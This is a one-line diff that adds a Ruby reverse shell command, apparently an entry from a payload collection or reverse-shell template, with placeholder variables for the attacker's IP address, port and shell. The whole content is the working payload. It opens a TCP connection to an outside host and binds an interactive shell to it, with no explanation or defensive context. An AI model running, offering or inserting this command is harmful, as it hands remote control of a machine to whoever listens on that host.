@@ -1,0 +1,1 @@
+ruby -rsocket -e'f=TCPSocket.open("$ip",$port).to_i;exec sprintf("$shell -i <&%d >&%d 2>&%d",f,f,f)'
